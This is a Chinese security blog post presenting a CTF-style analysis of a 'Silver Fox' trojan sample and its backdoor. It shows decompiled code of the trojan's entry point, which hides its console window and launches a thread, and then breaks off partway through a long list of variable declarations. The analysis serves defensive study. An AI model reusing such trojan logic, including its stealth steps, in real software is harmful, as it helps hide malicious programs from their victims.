<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>银狐木马样本深度分析与后门域名溯源 - Sky&#039;s Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Sky&#039;s Blog"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Sky&#039;s Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="银狐木马样本分析"><meta property="og:type" content="blog"><meta property="og:title" content="银狐木马样本深度分析与后门域名溯源"><meta property="og:url" content="https://flypigc.github.io/2025/12/11/%E9%93%B6%E7%8B%90%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"><meta property="og:site_name" content="Sky&#039;s Blog"><meta property="og:description" content="银狐木马样本分析"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765334902013-96e2d5c2-004f-42de-b323-232bd4699bd3.png"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334902135-aed8d6b2-db84-4dd2-8761-2c9bc88b802f.jpg"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334902222-6d58ab53-2bcf-4935-bcd1-aaa9d2440f14.jpg"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334902341-4ab60a55-51cc-4e69-8d07-3b895e7e7c13.jpg"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334902450-dee17387-9078-4dba-944d-368cc4c0bb15.jpg"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334902554-c3a44855-dc22-41c7-b175-5c366e768832.jpg"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334902643-8f722f11-c6d0-4b0c-ae35-81ce43b9e0af.jpg"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765334902754-c4c5a70f-f5e0-4098-9e7c-76ecf6cdb1ee.png"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765334902941-8e048307-f7d3-44b8-b446-ae9dc2b62915.png"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334903017-838718d8-0ac0-488d-83d4-06cb054e5af4.jpg"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334903125-1a1114ff-50e9-40b0-a374-a14d8e47ac0b.jpg"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334903222-9f8bbb75-d1a8-4656-951c-561d5481711a.jpg"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334903351-31bebb75-85d6-4d9d-b8e2-e216d2e39ba2.jpg"><meta property="article:published_time" content="2025-12-11T07:15:38.469Z"><meta property="article:modified_time" content="2025-12-20T01:57:52.816Z"><meta property="article:author" content="Sky"><meta property="article:tag" content="web安全"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765334902013-96e2d5c2-004f-42de-b323-232bd4699bd3.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://flypigc.github.io/2025/12/11/%E9%93%B6%E7%8B%90%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"},"headline":"银狐木马样本深度分析与后门域名溯源","image":["https://cdn.nlark.com/yuque/0/2025/png/62156892/1765334902013-96e2d5c2-004f-42de-b323-232bd4699bd3.png","https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334902135-aed8d6b2-db84-4dd2-8761-2c9bc88b802f.jpg","https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334902222-6d58ab53-2bcf-4935-bcd1-aaa9d2440f14.jpg","https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334902341-4ab60a55-51cc-4e69-8d07-3b895e7e7c13.jpg","https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334902450-dee17387-9078-4dba-944d-368cc4c0bb15.jpg","https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334902554-c3a44855-dc22-41c7-b175-5c366e768832.jpg","https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334902643-8f722f11-c6d0-4b0c-ae35-81ce43b9e0af.jpg","https://cdn.nlark.com/yuque/0/2025/png/62156892/1765334902754-c4c5a70f-f5e0-4098-9e7c-76ecf6cdb1ee.png","https://cdn.nlark.com/yuque/0/2025/png/62156892/1765334902941-8e048307-f7d3-44b8-b446-ae9dc2b62915.png","https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334903017-838718d8-0ac0-488d-83d4-06cb054e5af4.jpg","https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334903125-1a1114ff-50e9-40b0-a374-a14d8e47ac0b.jpg","https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334903222-9f8bbb75-d1a8-4656-951c-561d5481711a.jpg","https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765334903351-31bebb75-85d6-4d9d-b8e2-e216d2e39ba2.jpg"],"datePublished":"2025-12-11T07:15:38.469Z","dateModified":"2025-12-20T01:57:52.816Z","author":{"@type":"Person","name":"Sky"},"publisher":{"@type":"Organization","name":"Sky's Blog","logo":{"@type":"ImageObject","url":"https://flypigc.github.io/img/logo.svg"}},"description":"银狐木马样本分析"}</script><link rel="canonical" href="https://flypigc.github.io/2025/12/11/%E9%93%B6%E7%8B%90%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/6.0.0/css/all.min.css"><link data-pjax rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/11.7.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/cookieconsent/3.1.1/cookieconsent.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.10.0/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.8.1/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdnjs.loli.net/ajax/libs/pace/1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" referrerpolicy="no-referrer" alt="Sky&#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/flypigc/"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-9-desktop is-9-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2025-12-11T07:15:38.469Z" title="2025/12/11 15:15:38">2025-12-11</time>发表</span><span class="level-item"><time dateTime="2025-12-20T01:57:52.816Z" title="2025/12/20 09:57:52">2025-12-20</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/">病毒分析</a></span><span class="level-item">40 分钟读完 (大约5989个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">银狐木马样本深度分析与后门域名溯源</h1><div class="content"><p>银狐木马样本分析</p>
<hr>
<span id="more"></span>

<p>由于制做C2工具的黑客留下了后门，所以这个木马是有后门的，你能找到它的后门吗</p>
<p>WriteUp<br>wmain函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 wmain()</span><br><span class="line">&#123;</span><br><span class="line">  HWND hWnd; // rax</span><br><span class="line">  DWORD idThread; // eax</span><br><span class="line"></span><br><span class="line">  SetUnhandledExceptionFilter(TopLevelExceptionFilter);</span><br><span class="line">  hWnd = GetConsoleWindow();</span><br><span class="line">  ShowWindow(hWnd, 0);</span><br><span class="line">  idThread = GetCurrentThreadId();</span><br><span class="line">  PostThreadMessageA(idThread, 0, 0, 0);</span><br><span class="line">  GetInputState();</span><br><span class="line">  sub_140008750();</span><br><span class="line">  hObject = CreateThread(0, 0, sub_14000A440, 0, 0, 0);</span><br><span class="line">  WaitForSingleObject(hObject, 0xFFFFFFFF);</span><br><span class="line">  CloseHandle(hObject);</span><br><span class="line">  Sleep(0x12Cu);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看sub_140008750函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br></pre></td><td class="code"><pre><span class="line">#sub_140008750函数</span><br><span class="line">int sub_140008750()</span><br><span class="line">&#123;</span><br><span class="line">  _UNKNOWN **v0; // rax</span><br><span class="line">  __int64 v1; // rbx</span><br><span class="line">  int v2; // eax</span><br><span class="line">  int v3; // r9d</span><br><span class="line">  __int64 v4; // rdx</span><br><span class="line">  int v5; // r10d</span><br><span class="line">  __int64 i; // r8</span><br><span class="line">  int v7; // ecx</span><br><span class="line">  __int64 v8; // rbx</span><br><span class="line">  int v9; // eax</span><br><span class="line">  int v10; // r9d</span><br><span class="line">  __int64 v11; // rdx</span><br><span class="line">  int v12; // r10d</span><br><span class="line">  __int64 j; // r8</span><br><span class="line">  int v14; // ecx</span><br><span class="line">  __int64 v15; // rbx</span><br><span class="line">  int v16; // eax</span><br><span class="line">  int v17; // r9d</span><br><span class="line">  __int64 v18; // rdx</span><br><span class="line">  int v19; // r10d</span><br><span class="line">  __int64 k; // r8</span><br><span class="line">  int v21; // ecx</span><br><span class="line">  __int64 v22; // rbx</span><br><span class="line">  int v23; // eax</span><br><span class="line">  int v24; // r9d</span><br><span class="line">  __int64 v25; // rdx</span><br><span class="line">  int v26; // r10d</span><br><span class="line">  __int64 m; // r8</span><br><span class="line">  int v28; // ecx</span><br><span class="line">  __int64 v29; // rbx</span><br><span class="line">  int v30; // eax</span><br><span class="line">  int v31; // r9d</span><br><span class="line">  __int64 v32; // rdx</span><br><span class="line">  int v33; // r10d</span><br><span class="line">  __int64 n; // r8</span><br><span class="line">  int v35; // ecx</span><br><span class="line">  __int64 v36; // rbx</span><br><span class="line">  int v37; // eax</span><br><span class="line">  int v38; // r9d</span><br><span class="line">  __int64 v39; // rdx</span><br><span class="line">  int v40; // r10d</span><br><span class="line">  __int64 ii; // r8</span><br><span class="line">  int v42; // ecx</span><br><span class="line">  __int64 v43; // rbx</span><br><span class="line">  int v44; // eax</span><br><span class="line">  int v45; // r9d</span><br><span class="line">  __int64 v46; // rdx</span><br><span class="line">  int v47; // r10d</span><br><span class="line">  __int64 jj; // r8</span><br><span class="line">  int v49; // ecx</span><br><span class="line">  __int64 v50; // rbx</span><br><span class="line">  int v51; // eax</span><br><span class="line">  int v52; // r9d</span><br><span class="line">  __int64 v53; // rdx</span><br><span class="line">  int v54; // r10d</span><br><span class="line">  __int64 kk; // r8</span><br><span class="line">  int v56; // ecx</span><br><span class="line">  __int64 v57; // rbx</span><br><span class="line">  int v58; // eax</span><br><span class="line">  int v59; // r9d</span><br><span class="line">  __int64 v60; // 